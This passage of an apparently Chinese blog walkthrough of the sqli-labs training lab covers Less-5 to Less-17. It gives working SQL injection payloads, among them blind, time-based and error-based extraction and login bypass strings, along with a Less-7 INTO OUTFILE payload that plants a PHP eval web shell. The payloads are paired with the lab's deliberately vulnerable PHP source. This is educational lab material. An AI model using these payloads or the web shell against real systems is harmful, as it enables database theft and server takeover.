<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#看users中是否有以us开头的列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br><span class="line"><span class="comment">#看users中是否有以pass开头的列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^pass[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>

<h5 id="利用ord-和mid-函数获取users-表的内容"><a href="#利用ord-和mid-函数获取users-表的内容" class="headerlink" title="利用ord()和mid()函数获取users 表的内容"></a>利用ord()和mid()函数获取users 表的内容</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一个用户名为Dumb，此语句是看第一个用户名的第一个字符是否为D</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>--+</span><br></pre></td></tr></table></figure>

<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/JxSir/articles/15183838.html">MySQL ERROR 1267 (HY000)错误解决办法</a></p>
</blockquote>
<h5 id="利用floor-rand-0-2-进行报错注入"><a href="#利用floor-rand-0-2-进行报错注入" class="headerlink" title="利用floor(rand(0)*2)进行报错注入"></a>利用floor(rand(0)*2)进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,count(*),concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand(<span class="number">0</span>)*<span class="number">2</span>))a from information_schema.columns  group by a--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/jVI2pOsYowrS3e9.png" alt="5_1.png"></p>
<h5 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a>利用 double 数值类型超出范围进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> (exp(~(<span class="literal">select</span> * FROM(SELECT USER())a))),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<h5 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a>利用 bigint 溢出进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">union</span> <span class="literal">select</span> (!(<span class="literal">select</span> * from (<span class="literal">select</span> user())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>

<h5 id="利用xpath-函数报错注入"><a href="#利用xpath-函数报错注入" class="headerlink" title="利用xpath 函数报错注入"></a>利用xpath 函数报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/k4lyGzREivtZDOj.png" alt="5_2.png"></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> updatexml(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/qBsh1nNgyuUOJk4.png" alt="5_3.png"></p>
<h5 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a>利用数据的重复性</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from (<span class="literal">select</span> NAME_CONST(version(),<span class="number">1</span>), NAME_CONST(version(),<span class="number">1</span>))x--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/OoRQ4mK8lukwNcq.png" alt="5_4.png"></p>
<h5 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;UNION SELECT (IF(SUBSTRING(current,<span class="number">1</span>,<span class="number">1</span>)=CHAR(<span class="number">115</span>),BENCHMARK(<span class="number">50000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),null)),<span class="number">2</span>,<span class="number">3</span> FROM (<span class="literal">select</span> database() as cur</span><br><span class="line">rent) as tb1--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h3><h4 id="手动注入-4"><a href="#手动注入-4" class="headerlink" title="手动注入"></a>手动注入</h4><p>利用报错注入可以看到版本信息。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-6/?id=1&quot;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-5"><a href="#源码分析-5" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>用<code>&quot;&quot;</code>来处理<code>$id</code>，不回显正常输出的信息。</p>
<h3 id="Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h3><h4 id="源码分析-6"><a href="#源码分析-6" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以看出是使用了<code>((&#39;&#39;))</code>来处理输入。</p>
<h4 id="手动注入-5"><a href="#手动注入-5" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试是否存在注入</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;)) <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#将user,2,3写入文件uuu.txt中</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT user(),<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;txt文件路径&quot;</span>--+</span><br><span class="line"><span class="comment">#将一句话木马写入进去</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT <span class="string">&#x27;&lt;?php <span class="variable">@eval</span>(<span class="variable">$_POST</span>[&quot;attack&quot;])?&gt;&#x27;</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;php文件路径&quot;</span>--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h3><h4 id="手动注入-6"><a href="#手动注入-6" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试注入点</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#布尔盲注</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27; and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-7"><a href="#源码分析-7" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line">	<span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>这一关错误信息也不再回显，但可以通过是否出现<code>You are in...........</code>来实现布尔盲注。</p>
<h3 id="Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="Less-9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)"></a>Less-9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</h3><h4 id="手动注入-7"><a href="#手动注入-7" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#时间盲注</span></span><br><span class="line"><span class="comment">#猜测数据库security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;and If(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-8"><a href="#源码分析-8" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h3><p>输入被用<code>&quot;&quot;</code>处理，其他与less-9相同。</p>
<h3 id="Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h3><h4 id="手动注入-8"><a href="#手动注入-8" class="headerlink" title="手动注入"></a>手动注入</h4><p>post接收参数</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万能，密码随意</span></span><br><span class="line">admin&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#爆库名，密码随意</span></span><br><span class="line">1admin<span class="string">&#x27;union select 1,database()#</span></span><br></pre></td></tr></table></figure>

<h4 id="源码分析-9"><a href="#源码分析-9" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h3><h4 id="手动注入-9"><a href="#手动注入-9" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#post传入</span></span><br><span class="line">uname=1&quot;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure>

<h4 id="源码分析-10"><a href="#源码分析-10" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h3><h4 id="手动注入-10"><a href="#手动注入-10" class="headerlink" title="手动注入"></a>手动注入</h4><p>先用万能密码登录。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/j7OKIP4yh2SV8x5.png" alt="13.png"></p>
<p>登录成功后便可以使用布尔盲注爆库等信息。</p>
<h4 id="源码分析-11"><a href="#源码分析-11" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h3><h4 id="手动注入-11"><a href="#手动注入-11" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万能密码</span></span><br><span class="line">admin&quot;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">uname=admin<span class="string">&quot;and extractvalue(1,concat(0x7e,(select @<span class="variable">@version</span>),0x7e))#&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/JoPmqcNLdfSwTi7.png" alt="14.png"></p>
<h4 id="源码分析-12"><a href="#源码分析-12" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-基于bool型-x2F-时间延迟单引号POST型盲注"><a href="#less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-基于bool型-x2F-时间延迟单引号POST型盲注" class="headerlink" title="less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (基于bool型&#x2F;时间延迟单引号POST型盲注)"></a>less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (基于bool型&#x2F;时间延迟单引号POST型盲注)</h3><h4 id="手动注入-12"><a href="#手动注入-12" class="headerlink" title="手动注入"></a>手动注入</h4><p>使用延时注入，正确直接登录成功，否则延时5s。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h4 id="源码分析-13"><a href="#源码分析-13" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-基于bool型-x2F-时间延迟的双引号POST型盲注"><a href="#Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-基于bool型-x2F-时间延迟的双引号POST型盲注" class="headerlink" title="Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)"></a>Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)</h3><h4 id="手动注入-13"><a href="#手动注入-13" class="headerlink" title="手动注入"></a>手动注入</h4><p>使用延时注入，正确直接登录成功，否则延时5s。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&quot;)<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h4 id="源码分析-14"><a href="#源码分析-14" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h3><h4 id="手动注入-14"><a href="#手动注入-14" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">uname=admin&amp;passwd=11&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))<span class="comment">#&amp;submit=Submit</span></span><br><span class="line"><span class="comment">#延时注入</span></span><br><span class="line">uname=admin&amp;passwd=<span class="number">11</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h4 id="源码分析-15"><a href="#源码分析-15" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Quote if not a number</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span 